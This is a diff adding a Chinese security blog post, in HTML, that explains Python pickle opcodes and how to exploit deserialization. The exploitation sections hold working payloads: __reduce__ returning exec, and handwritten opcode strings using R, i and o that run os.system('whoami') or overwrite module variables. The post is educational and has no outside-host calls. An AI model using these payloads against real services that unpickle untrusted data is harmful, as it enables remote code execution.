@@ -1,0 +1,214 @@
+<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Pickle 序列化与反序列化 | w8nn9z Blog</title><meta name=keywords content><meta name=description content="Pickle 序列化与反序列化 - w8nn9z Blog"><meta name=author content><link rel=canonical href=https://blog.w8nn9z.top/posts/web/pickle/><link crossorigin=anonymous href=/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css integrity rel="preload stylesheet" as=style><link rel=icon href=https://blog.w8nn9z.top/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://blog.w8nn9z.top/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://blog.w8nn9z.top/favicon-32x32.png><link rel=apple-touch-icon href=https://blog.w8nn9z.top/apple-touch-icon.png><link rel=mask-icon href=https://blog.w8nn9z.top/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://blog.w8nn9z.top/posts/web/pickle/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://blog.w8nn9z.top/posts/web/pickle/"><meta property="og:site_name" content="w8nn9z Blog"><meta property="og:title" content="Pickle 序列化与反序列化"><meta property="og:locale" content="zh-cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-08-18T00:00:00+00:00"><meta property="article:modified_time" content="2025-08-18T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Pickle 序列化与反序列化"><meta name=twitter:description content><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://blog.w8nn9z.top/posts/"},{"@type":"ListItem","position":2,"name":"WEB","item":"https://blog.w8nn9z.top/posts/web/"},{"@type":"ListItem","position":3,"name":"Pickle 序列化与反序列化","item":"https://blog.w8nn9z.top/posts/web/pickle/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Pickle 序列化与反序列化","name":"Pickle 序列化与反序列化","description":"","keywords":[],"articleBody":"Pickle序列化过程 pickle解析依靠PVM完成，PVM包含三部分：\n指令处理器（解析引擎）：读取opcode和参数，直到遇到`.`停止，最终留在栈顶的值将被作为反序列化对象返回\rstack：由 Python 的 list 实现，被用来临时存储数据、参数以及对象\rmemo：由 Python 的 dict 实现，为 PVM 的整个生命周期提供存储，即将反序列化后的结果以键值对形式存储 opcode pickle的版本不同会导致生成的opcode不同，但是pickle可以向下兼容，即v0版本的序列化内容可以被其他任意版本解析\nv0版本常用opcode：\nc：c[module]\\n[instance]\\n，获得的对象入栈，等同于import\ro：寻找栈中的上一个MARK，之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象），函数的返回值（或生成的对象）入栈\r(：向栈中压入一个MARK标记\rS：S'xxx'\\n，实例化一个字符串对象，获得的对象入栈\rs：将栈顶的第二个和第一个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典）中，第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新\rV：Vxxx\\n，实例化一个UNICODE字符串对象，获得的对象入栈\ri：i[module]\\n[callable]\\n，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行函数（或实例化一个对象），函数返回值（或生成的对象）入栈\rd：寻找栈中的上一个MARK，并组合之间的数据为字典，数据必须有偶数个，即呈key-value对，MARK标记以及被组合的数据出栈，获得的对象入栈\rb：使用栈顶的第一个数据（储存键值对的字典），对第二个数据（对象实例）进行属性设置，栈顶第一个数据出栈\rt：寻找栈中的上一个MARK，并组合之间的数据为元组，MARK标记以及被组合的数据出栈，获得的对象入栈\rR: 选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数，函数和参数出栈，函数的返回值入栈\rp：pn\\n，将栈顶对象储存至memo_n pickletools 使用pickletools可以将opcode转为可视化的结构，可读性更强，例如：\nimport pickle import pickletools a = {\"abc\":123, \"456\":\"DEF\"} ser = pickle.dumps(a, protocol=0) print(b\"opcode: \" + ser) pickletools.dis(ser) 运行结果： b'opcode: (dp0\\nVabc\\np1\\nI123\\nsV456\\np2\\nVDEF\\np3\\ns.' 0: ( MARK 1: d DICT (MARK at 0) 2: p PUT 0 5: V UNICODE 'abc' 10: p PUT 1 13: I INT 123 18: s SETITEM 19: V UNICODE '456' 24: p PUT 2 27: V UNICODE 'DEF' 32: p PUT 3 35: s SETITEM 36: . STOP highest protocol among opcodes = 0 pickle反序列化利用思路 RCE __reduce__()魔术方法在序列化时被调用，即pickle.dumps()，返回值决定了反序列化时的行为，即pickle.loads()：\ndef __reduce__(self) -\u003e str | tuple[Any, ...]: ... 必须返回字符串或元组，假如返回元组可实现代码执行：\ndef __reduce__(self): return (callable, (arg1, arg2, ...)) callable是要执行的函数，arg是参数，简单利用例子：\nimport pickle class test(object): def __reduce__(self): s = \"print('command1 executed');print('command2 executed')\" # 要执行的命令 return (exec, (s,)) ser = pickle.dumps(test(), protocol=0) pickle.loads(ser) 变量覆盖 import pickle key = 1 class test(object): def __reduce__(self): s = \"key=258\" return (exec, (s,)) ser = pickle.dumps(test(), protocol=0) pickle.loads(ser) print(key) # 258 手写opcode 如果过滤或禁用了exec，将无法使用__reduce__()来执行多段代码，此时就需要手写opcode\n变量覆盖 secret.py：\nkey = \"sxc\" 尝试覆盖secret.py中的变量：\nimport pickle import secret opcode = \"\"\"c__main__ secret (S'key' S'258' db. \"\"\" print(secret.key) # sxc pickle.loads(opcode.encode()) print(secret.key) # 258 RCE 可以通过R，i，o三种方式执行命令\nR：\ncos\rsystem\r(S'whoami'\rtR. i：\n(S'whoami'\rios\rsystem\r. o：\n(cos\rsystem\rS'whoami'\ro. 实例化对象 import pickle class User: def __init__(self, name, age): self.name = name self.age = age opcode='''c__main__ User (S'ChuanSao' S\"258\" tR.''' user = pickle.loads(opcode.encode()) print(user.name, user.age) # ChuanSao 258 pker Tools for converting Python source code to Pickle opcode automatically\n工具地址：https://github.com/eddieivan01/pker\npker主要用到GLOBAL、INST、OBJ三种特殊的函数以及一些必要的转换方式：\nGLOBAL 对应 opcode:c\rGLOBAL('os', 'system') 对应 opcode:cos\\nsystem\\n\rINST 对应 opcode:i\rINST('os', 'system', 'whoami') 对应 opcode:(S'whoami'\\nios\\nsystem\\n\rOBJ 对应 opcode:o\rOBJ(GLOBAL('os', 'system'), 'whoami') 对应 opcode:(cos\\nsystem\\nS'whoami'\\no\rxxx.attr='sxc' 对应opcode:(S'attr'\\nS'sxc'\\ndb\rreturn 对应 opcode:. 基本用法 pker：\nINST('os', 'system', 'whoami')\rreturn 利用pker.py转换为opcode：\npython pker.py \u003c pker b\"(S'whoami'\\nios\\nsystem\\n.\" opcode表： MARK = b'(' # push special markobject on stack\rSTOP = b'.' # every pickle ends with STOP\rPOP = b'0' # discard topmost stack item\rPOP_MARK = b'1' # discard stack top through topmost markobject\rDUP = b'2' # duplicate top stack item\rFLOAT = b'F' # push float object; decimal string argument\rINT = b'I' # push integer or bool; decimal string argument\rBININT = b'J' # push four-byte signed int\rBININT1 = b'K' # push 1-byte unsigned int\rLONG = b'L' # push long; decimal string argument\rBININT2 = b'M' # push 2-byte unsigned int\rNONE = b'N' # push None\rPERSID = b'P' # push persistent object; id is taken from string arg\rBINPERSID = b'Q' # \" \" \" ; \" \" \" \" stack\rREDUCE = b'R' # apply callable to argtuple, both on stack\rSTRING = b'S' # push string; NL-terminated string argument\rBINSTRING = b'T' # push string; counted binary string argument\rSHORT_BINSTRING= b'U' # \" \" ; \" \" \" \" \u003c 256 bytes\rUNICODE = b'V' # push Unicode string; raw-unicode-escaped'd argument\rBINUNICODE = b'X' # \" \" \" ; counted UTF-8 string argument\rAPPEND = b'a' # append stack top to list below it\rBUILD = b'b' # call __setstate__ or __dict__.update()\rGLOBAL = b'c' # push self.find_class(modname, name); 2 string args\rDICT = b'd' # build a dict from stack items\rEMPTY_DICT = b'}' # push empty dict\rAPPENDS = b'e' # extend list on stack by topmost stack slice\rGET = b'g' # push item from memo on stack; index is string arg\rBINGET = b'h' # \" \" \" \" \" \" ; \" \" 1-byte arg\rINST = b'i' # build \u0026 push class instance\rLONG_BINGET = b'j' # push item from memo on stack; index is 4-byte arg\rLIST = b'l' # build list from topmost stack items\rEMPTY_LIST = b']' # push empty list\rOBJ = b'o' # build \u0026 push class instance\rPUT = b'p' # store stack top in memo; index is string arg\rBINPUT = b'q' # \" \" \" \" \" ; \" \" 1-byte arg\rLONG_BINPUT = b'r' # \" \" \" \" \" ; \" \" 4-byte arg\rSETITEM = b's' # add key+value pair to dict\rTUPLE = b't' # build tuple from topmost stack items\rEMPTY_TUPLE = b')' # push empty tuple\rSETITEMS = b'u' # modify dict by adding topmost key+value pairs\rBINFLOAT = b'G' # push float; arg is 8-byte float encoding\rTRUE = b'I01\\n' # not an opcode; see INT docs in pickletools.py\rFALSE = b'I00\\n' # not an opcode; see INT docs in pickletools.py\r# Protocol 2\rPROTO = b'\\x80' # identify pickle protocol\rNEWOBJ = b'\\x81' # build object by applying cls.__new__ to argtuple\rEXT1 = b'\\x82' # push object from extension registry; 1-byte index\rEXT2 = b'\\x83' # ditto, but 2-byte index\rEXT4 = b'\\x84' # ditto, but 4-byte index\rTUPLE1 = b'\\x85' # build 1-tuple from stack top\rTUPLE2 = b'\\x86' # build 2-tuple from two topmost stack items\rTUPLE3 = b'\\x87' # build 3-tuple from three topmost stack items\rNEWTRUE = b'\\x88' # push True\rNEWFALSE = b'\\x89' # push False\rLONG1 = b'\\x8a' # push long from \u003c 256 bytes\rLONG4 = b'\\x8b' # push really big long\r_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]\r# Protocol 3 (Python 3.x)\rBINBYTES = b'B' # push bytes; counted binary string argument\rSHORT_BINBYTES = b'C' # \" \" ; \" \" \" \" \u003c 256 bytes\r# Protocol 4\rSHORT_BINUNICODE = b'\\x8c' # push short string; UTF-8 length \u003c 256 bytes\rBINUNICODE8 = b'\\x8d' # push very long string\rBINBYTES8 = b'\\x8e' # push very long bytes string\rEMPTY_SET = b'\\x8f' # push empty set on the stack\rADDITEMS = b'\\x90' # modify set by adding topmost stack items\rFROZENSET = b'\\x91' # build frozenset from topmost stack items\rNEWOBJ_EX = b'\\x92' # like NEWOBJ but work with keyword only arguments\rSTACK_GLOBAL = b'\\x93' # same as GLOBAL but using names on the stacks\rMEMOIZE = b'\\x94' # store top of the stack in memo\rFRAME = b'\\x95' # indicate the beginning of a new frame\r# Protocol 5\rBYTEARRAY8 = b'\\x96' # push bytearray\rNEXT_BUFFER = b'\\x97' # push next out-of-band buffer\rREADONLY_BUFFER = b'\\x98' # make top of stack readonly 参考资料：\nhttps://xz.aliyun.com/news/13498\nhttps://xz.aliyun.com/news/7032\nhttps://zixyd.github.io/2024/02/06/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/\n","wordCount":"2355","inLanguage":"en","datePublished":"2025-08-18T00:00:00Z","dateModified":"2025-08-18T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.w8nn9z.top/posts/web/pickle/"},"publisher":{"@type":"Organization","name":"w8nn9z Blog","logo":{"@type":"ImageObject","url":"https://blog.w8nn9z.top/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://blog.w8nn9z.top/ accesskey=h title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
+<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://blog.w8nn9z.top/search title="搜索 (Alt + /)" accesskey=/><span>搜索</span></a></li><li><a href=https://blog.w8nn9z.top/posts title=文章><span>文章</span></a></li><li><a href=https://blog.w8nn9z.top/archives title=归档><span>归档</span></a></li><li><a href=https://blog.w8nn9z.top/about title=关于><span>关于</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Pickle 序列化与反序列化</h1><div class=post-meta><span title='2025-08-18 00:00:00 +0000 UTC'>August 18, 2025</span></div></header><aside id=toc-container class="toc-container wide"><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#pickle%e5%ba%8f%e5%88%97%e5%8c%96%e8%bf%87%e7%a8%8b aria-label=Pickle序列化过程>Pickle序列化过程</a></li><li><a href=#opcode aria-label=opcode>opcode</a></li><li><a href=#pickletools aria-label=pickletools>pickletools</a></li><li><a href=#pickle%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%88%a9%e7%94%a8%e6%80%9d%e8%b7%af aria-label=pickle反序列化利用思路>pickle反序列化利用思路</a><ul><li><a href=#rce aria-label=RCE>RCE</a></li><li><a href=#%e5%8f%98%e9%87%8f%e8%a6%86%e7%9b%96 aria-label=变量覆盖>变量覆盖</a></li></ul></li><li><a href=#%e6%89%8b%e5%86%99opcode aria-label=手写opcode>手写opcode</a><ul><li><a href=#%e5%8f%98%e9%87%8f%e8%a6%86%e7%9b%96-1 aria-label=变量覆盖>变量覆盖</a></li><li><a href=#rce-1 aria-label=RCE>RCE</a></li><li><a href=#%e5%ae%9e%e4%be%8b%e5%8c%96%e5%af%b9%e8%b1%a1 aria-label=实例化对象>实例化对象</a></li></ul></li><li><a href=#pker aria-label=pker>pker</a><ul><li><a href=#%e5%9f%ba%e6%9c%ac%e7%94%a8%e6%b3%95 aria-label=基本用法>基本用法</a></li></ul></li><li><a href=#opcode%e8%a1%a8 aria-label=opcode表：>opcode表：</a></li></ul></div></details></div></aside><script>let activeElement,elements;document.addEventListener("DOMContentLoaded",function(){if(checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),elements.length>0){activeElement=elements[0];const e=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${e}"]`).classList.add("active")}const t=document.getElementById("top-link");t&&t.addEventListener("click",e=>{e.preventDefault(),window.scrollTo({top:0,behavior:"smooth"})})},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{const e=window.pageYOffset||document.documentElement.scrollTop;if(e===0)return;elements&&elements.length>0&&(activeElement=Array.from(elements).find(t=>{if(getOffsetTop(t)-e>0&&getOffsetTop(t)-e<window.innerHeight/2)return t})||activeElement,elements.forEach(e=>{const n=encodeURI(e.getAttribute("id")).toLowerCase(),t=document.querySelector(`.inner ul li a[href="#${n}"]`);if(e===activeElement){t.classList.add("active");const e=document.querySelector(".toc .inner"),n=t.offsetTop,s=e.clientHeight,o=t.clientHeight,i=n-s/2+o/2;e.scrollTo({top:i,behavior:"smooth"})}else t.classList.remove("active")}))},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><h2 id=pickle序列化过程>Pickle序列化过程<a hidden class=anchor aria-hidden=true href=#pickle序列化过程>#</a></h2><p>pickle解析依靠PVM完成，PVM包含三部分：</p><pre tabindex=0><code>指令处理器（解析引擎）：读取opcode和参数，直到遇到`.`停止，最终留在栈顶的值将被作为反序列化对象返回
+stack：由 Python 的 list 实现，被用来临时存储数据、参数以及对象
+memo：由 Python 的 dict 实现，为 PVM 的整个生命周期提供存储，即将反序列化后的结果以键值对形式存储
+</code></pre><h2 id=opcode>opcode<a hidden class=anchor aria-hidden=true href=#opcode>#</a></h2><p>pickle的版本不同会导致生成的opcode不同，但是pickle可以向下兼容，即v0版本的序列化内容可以被其他任意版本解析</p><p>v0版本常用opcode：</p><pre tabindex=0><code>c：c[module]\n[instance]\n，获得的对象入栈，等同于import
+o：寻找栈中的上一个MARK，之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象），函数的返回值（或生成的对象）入栈
+(：向栈中压入一个MARK标记
+S：S&#39;xxx&#39;\n，实例化一个字符串对象，获得的对象入栈
+s：将栈顶的第二个和第一个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典）中，第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新
+V：Vxxx\n，实例化一个UNICODE字符串对象，获得的对象入栈
+i：i[module]\n[callable]\n，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行函数（或实例化一个对象），函数返回值（或生成的对象）入栈
+d：寻找栈中的上一个MARK，并组合之间的数据为字典，数据必须有偶数个，即呈key-value对，MARK标记以及被组合的数据出栈，获得的对象入栈
+b：使用栈顶的第一个数据（储存键值对的字典），对第二个数据（对象实例）进行属性设置，栈顶第一个数据出栈
+t：寻找栈中的上一个MARK，并组合之间的数据为元组，MARK标记以及被组合的数据出栈，获得的对象入栈
+R: 选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数，函数和参数出栈，函数的返回值入栈
+p：pn\n，将栈顶对象储存至memo_n
+</code></pre><h2 id=pickletools>pickletools<a hidden class=anchor aria-hidden=true href=#pickletools>#</a></h2><p>使用pickletools可以将opcode转为可视化的结构，可读性更强，例如：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-Python data-lang=Python><span style=display:flex><span><span style=color:#f92672>import</span> pickle
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> pickletools
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>a <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;abc&#34;</span>:<span style=color:#ae81ff>123</span>, <span style=color:#e6db74>&#34;456&#34;</span>:<span style=color:#e6db74>&#34;DEF&#34;</span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>ser <span style=color:#f92672>=</span> pickle<span style=color:#f92672>.</span>dumps(a, protocol<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>print(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;opcode: &#34;</span> <span style=color:#f92672>+</span> ser)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>pickletools<span style=color:#f92672>.</span>dis(ser)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>运行结果<span style=color:#960050;background-color:#1e0010>：</span>
+</span></span><span style=display:flex><span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;opcode: (dp0</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Vabc</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>p1</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>I123</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>sV456</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>p2</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>VDEF</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>p3</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>s.&#39;</span>
+</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0</span>: (    MARK
+</span></span><span style=display:flex><span>    <span style=color:#ae81ff>1</span>: d        DICT       (MARK at <span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>    <span style=color:#ae81ff>2</span>: p    PUT        <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#ae81ff>5</span>: V    UNICODE    <span style=color:#e6db74>&#39;abc&#39;</span>
+</span></span><span style=display:flex><span>   <span style=color:#ae81ff>10</span>: p    PUT        <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>   <span style=color:#ae81ff>13</span>: I    INT        <span style=color:#ae81ff>123</span>
+</span></span><span style=display:flex><span>   <span style=color:#ae81ff>18</span>: s    SETITEM
+</span></span><span style=display:flex><span>   <span style=color:#ae81ff>19</span>: V    UNICODE    <span style=color:#e6db74>&#39;456&#39;</span>
+</span></span><span style=display:flex><span>   <span style=color:#ae81ff>24</span>: p    PUT        <span style=color:#ae81ff>2</span>
+</span></span><span style=display:flex><span>   <span style=color:#ae81ff>27</span>: V    UNICODE    <span style=color:#e6db74>&#39;DEF&#39;</span>
+</span></span><span style=display:flex><span>   <span style=color:#ae81ff>32</span>: p    PUT        <span style=color:#ae81ff>3</span>
+</span></span><span style=display:flex><span>   <span style=color:#ae81ff>35</span>: s    SETITEM
+</span></span><span style=display:flex><span>   <span style=color:#ae81ff>36</span>: <span style=color:#f92672>.</span>    STOP
+</span></span><span style=display:flex><span>highest protocol among opcodes <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
+</span></span></code></pre></div><h2 id=pickle反序列化利用思路>pickle反序列化利用思路<a hidden class=anchor aria-hidden=true href=#pickle反序列化利用思路>#</a></h2><h3 id=rce>RCE<a hidden class=anchor aria-hidden=true href=#rce>#</a></h3><p><code>__reduce__()</code>魔术方法在序列化时被调用，即pickle.dumps()，返回值决定了反序列化时的行为，即pickle.loads()：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__reduce__</span>(self) <span style=color:#f92672>-&gt;</span> str <span style=color:#f92672>|</span> tuple[Any, <span style=color:#f92672>...</span>]: <span style=color:#f92672>...</span>
+</span></span></code></pre></div><p>必须返回字符串或元组，假如返回元组可实现代码执行：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__reduce__</span>(self):
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> (callable, (arg1, arg2, <span style=color:#f92672>...</span>))
+</span></span></code></pre></div><p>callable是要执行的函数，arg是参数，简单利用例子：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> pickle
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>test</span>(object):
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__reduce__</span>(self):
+</span></span><span style=display:flex><span>        s <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;print(&#39;command1 executed&#39;);print(&#39;command2 executed&#39;)&#34;</span>  <span style=color:#75715e># 要执行的命令</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> (exec, (s,))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>ser <span style=color:#f92672>=</span> pickle<span style=color:#f92672>.</span>dumps(test(), protocol<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>pickle<span style=color:#f92672>.</span>loads(ser)
+</span></span></code></pre></div><h3 id=变量覆盖>变量覆盖<a hidden class=anchor aria-hidden=true href=#变量覆盖>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> pickle
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>key <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>test</span>(object):
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__reduce__</span>(self):
+</span></span><span style=display:flex><span>        s <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;key=258&#34;</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> (exec, (s,))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>ser <span style=color:#f92672>=</span> pickle<span style=color:#f92672>.</span>dumps(test(), protocol<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>pickle<span style=color:#f92672>.</span>loads(ser)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>print(key)  <span style=color:#75715e># 258</span>
+</span></span></code></pre></div><h2 id=手写opcode>手写opcode<a hidden class=anchor aria-hidden=true href=#手写opcode>#</a></h2><p>如果过滤或禁用了exec，将无法使用<code>__reduce__()</code>来执行多段代码，此时就需要手写opcode</p><h3 id=变量覆盖-1>变量覆盖<a hidden class=anchor aria-hidden=true href=#变量覆盖-1>#</a></h3><p>secret.py：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;sxc&#34;</span>
+</span></span></code></pre></div><p>尝试覆盖secret.py中的变量：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> pickle
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> secret
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>opcode <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;c__main__
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>secret
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>(S&#39;key&#39;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>S&#39;258&#39;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>db.
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>print(secret<span style=color:#f92672>.</span>key)  <span style=color:#75715e># sxc</span>
+</span></span><span style=display:flex><span>pickle<span style=color:#f92672>.</span>loads(opcode<span style=color:#f92672>.</span>encode())
+</span></span><span style=display:flex><span>print(secret<span style=color:#f92672>.</span>key)  <span style=color:#75715e># 258</span>
+</span></span></code></pre></div><h3 id=rce-1>RCE<a hidden class=anchor aria-hidden=true href=#rce-1>#</a></h3><p>可以通过R，i，o三种方式执行命令</p><p>R：</p><pre tabindex=0><code class=language-opcode data-lang=opcode>cos
+system
+(S&#39;whoami&#39;
+tR.
+</code></pre><p>i：</p><pre tabindex=0><code class=language-opcode data-lang=opcode>(S&#39;whoami&#39;
+ios
+system
+.
+</code></pre><p>o：</p><pre tabindex=0><code class=language-opcode data-lang=opcode>(cos
+system
+S&#39;whoami&#39;
+o.
+</code></pre><h3 id=实例化对象>实例化对象<a hidden class=anchor aria-hidden=true href=#实例化对象>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> pickle
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>User</span>:
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__init__</span>(self, name, age):
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>name <span style=color:#f92672>=</span> name
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>age <span style=color:#f92672>=</span> age
